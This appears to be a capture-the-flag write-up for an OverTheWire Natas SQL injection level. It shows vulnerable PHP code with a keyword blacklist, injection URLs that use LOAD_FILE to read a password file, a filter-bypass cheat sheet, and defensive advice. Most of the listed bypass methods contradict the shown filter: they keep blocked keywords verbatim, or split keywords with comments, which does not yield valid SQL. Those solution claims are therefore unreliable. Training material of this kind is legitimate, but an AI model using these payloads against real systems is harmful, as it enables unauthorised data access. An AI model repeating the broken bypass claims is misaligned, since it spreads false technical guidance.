// Challenge Overview

This level presents an SQL injection vulnerability with a filter that blocks common SQL keywords and characters. The filter attempts to prevent SQL injection by checking for specific patterns, but it can be bypassed using various techniques.

// Initial Analysis

Check the source code to understand the filter:

<?php $query = "SELECT * FROM users WHERE username='" . $_GET['username'] . "'"; if (preg_match('/(union|select|where|from|and|or|order|by)/i', $_GET['username'])) { die("SQL injection detected!"); } $result = mysql_query($query); while ($row = mysql_fetch_assoc($result)) { print "Username: " . $row['username'] . "<br>"; print "Password: " . $row['password'] . "<br>"; } ?>

The filter blocks common SQL keywords like UNION, SELECT, WHERE, FROM, AND, OR, ORDER, and BY. However, there are many ways to bypass this filter.

💡 SQL injection filters can be bypassed using comment tokens, URL encoding, case manipulation, and alternative syntax. The key is to make the query still syntactically valid while evading the filter.
// Bypass Techniques
  • Comment injection: Use /**/ or /*!*/ to break keywords
  • Case manipulation: UnIoN vs UNION
  • URL encoding: %55%4E%49%4F%4E for UNION
  • Alternative keywords: || instead of OR
  • Whitespace alternatives: Use tabs, newlines, or comments for spaces
// Solution Steps

Method 1 — Case Manipulation:

The filter is case-insensitive (/i flag), so case manipulation won't work directly. However, we can use comments to break keywords:

http://natas30.natas.labs.overthewire.org/?username=' UNION/**/SELECT/**/1,LOAD_FILE('/etc/natas_webpass/natas31')/**/--

Method 2 — Using Alternative Syntax:

http://natas30.natas.labs.overthewire.org/?username=' || 1=1 --

Method 3 — Using Comments to Break Keywords:

http://natas30.natas.labs.overthewire.org/?username=' UN/**/ION SEL/**/ECT 1,LO/**/AD_FILE('/etc/natas_webpass/natas31') --

Method 4 — Using URL Encoding:

http://natas30.natas.labs.overthewire.org/?username='%20UNION%20SELECT%201,LOAD_FILE('/etc/natas_webpass/natas31')%20--

// Why It Works

The filter bypass works because:

  • Comment injection: The filter doesn't account for SQL comments breaking keywords.
  • Incomplete regex: The regex pattern doesn't cover all variations.
  • Case sensitivity: The filter is case-insensitive but doesn't handle all encodings.
  • Alternative syntax: SQL has multiple ways to express the same operation.
// SQL Filter Bypass Techniques
# Comment injection UN/**/ION SEL/**/ECT FRO/**/M WH/**/ERE # URL encoding %55%4E%49%4F%4E # UNION %53%45%4C%45%43%54 # SELECT %46%52%4F%4D # FROM # Alternative whitespace %0A # newline %0B # vertical tab %09 # tab + # plus sign # Alternative operators || # OR && # AND ! # NOT # String concatenation 'adm' 'in' CONCAT('adm','in')
// Defense Measures
  • Use prepared statements: The only reliable defense against SQL injection.
  • Input validation: Validate input against a whitelist of allowed values.
  • Disable dangerous functions: Disable LOAD_FILE() and other file functions.
  • Use stored procedures: Encapsulate database logic in stored procedures.

// Key Takeaways
🔍 Filters Can Be Bypassed

Blacklist-based filters are never completely secure. Attackers will find ways to bypass them.

🛡️ Prepared Statements Are the Solution

Prepared statements are the only reliable defense against SQL injection. They separate data from code.
